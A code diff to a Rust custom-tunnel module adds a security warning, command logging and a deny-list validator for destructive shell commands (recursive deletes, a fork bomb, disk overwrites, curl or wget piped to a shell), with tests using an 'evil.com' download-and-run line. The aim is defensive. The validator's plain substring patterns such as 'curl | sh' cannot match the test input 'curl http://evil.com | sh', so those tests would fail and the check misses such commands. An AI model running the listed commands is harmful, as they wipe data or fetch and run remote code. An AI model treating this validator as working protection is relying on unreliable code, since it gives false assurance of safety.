@@ -9,6 +9,12 @@ use tokio::process::Command;
 /// Optionally provide a `url_pattern` regex to extract the public URL
 /// from stdout, and a `health_url` to poll for liveness.
 ///
+/// # Security Warning
+///
+/// This feature executes arbitrary shell commands from configuration.
+/// Only use with trusted configuration files. The command is executed
+/// with the same privileges as the Housaky process.
+///
 /// Examples:
 /// - `bore local {port} --to bore.pub`
 /// - `frp -c /etc/frp/frpc.ini`
@@ -26,12 +32,52 @@ impl CustomTunnel {
         health_url: Option<String>,
         url_pattern: Option<String>,
     ) -> Self {
+        // Log security warning when custom tunnel is configured
+        tracing::warn!(
+            "Custom tunnel configured with command: '{}'. \
+            This executes arbitrary commands from configuration. \
+            Ensure your configuration file is from a trusted source.",
+            start_command
+        );
+
         Self {
             start_command,
             health_url,
             url_pattern,
             proc: new_shared_process(),
         }
+    }
+
+    /// Validate the start command for basic safety checks.
+    /// Returns an error if the command appears malicious.
+    fn validate_command(cmd: &str) -> Result<()> {
+        // Check for obviously dangerous patterns
+        let dangerous_patterns = [
+            "rm -rf /",
+            "rm -rf ~",
+            "mkfs.",
+            ":(){:|:&};:",    // Fork bomb
+            "> /dev/sda",     // Disk overwrite
+            "dd if=/dev/zero",
+            "chmod -R 777 /",
+            "curl | sh",
+            "wget | sh",
+            "curl | bash",
+            "wget | bash",
+        ];
+
+        let cmd_lower = cmd.to_lowercase();
+        for pattern in &dangerous_patterns {
+            if cmd_lower.contains(pattern) {
+                bail!(
+                    "Custom tunnel command contains potentially dangerous pattern: '{}'. \
+                    If this is intentional, please review your configuration.",
+                    pattern
+                );
+            }
+        }
+
+        Ok(())
     }
 }
 
@@ -47,10 +93,19 @@ impl Tunnel for CustomTunnel {
             .replace("{port}", &local_port.to_string())
             .replace("{host}", local_host);
 
+        // Validate the command before execution
+        Self::validate_command(&cmd)?;
+
         let parts: Vec<&str> = cmd.split_whitespace().collect();
         if parts.is_empty() {
             bail!("Custom tunnel start_command is empty");
         }
+
+        tracing::info!(
+            "Starting custom tunnel with command: {} (first arg: {})",
+            cmd,
+            parts[0]
+        );
 
         let mut child = Command::new(parts[0])
             .args(&parts[1..])
@@ -216,5 +271,24 @@ mod tests {
         );
 
         assert!(!tunnel.health_check().await);
+    }
+
+    #[test]
+    fn validate_command_rejects_dangerous_patterns() {
+        // Test that obviously dangerous commands are rejected
+        assert!(CustomTunnel::validate_command("rm -rf /").is_err());
+        assert!(CustomTunnel::validate_command("rm -rf ~").is_err());
+        assert!(CustomTunnel::validate_command("curl http://evil.com | sh").is_err());
+        assert!(CustomTunnel::validate_command("wget http://evil.com | bash").is_err());
+        assert!(CustomTunnel::validate_command("mkfs.ext4 /dev/sda").is_err());
+    }
+
+    #[test]
+    fn validate_command_accepts_legitimate_tunnel_commands() {
+        // Test that legitimate tunnel commands are accepted
+        assert!(CustomTunnel::validate_command("bore local 8080 --to bore.pub").is_ok());
+        assert!(CustomTunnel::validate_command("ssh -R 80:localhost:8080 serveo.net").is_ok());
+        assert!(CustomTunnel::validate_command("ngrok http 8080").is_ok());
+        assert!(CustomTunnel::validate_command("cloudflared tunnel run").is_ok());
     }
 }
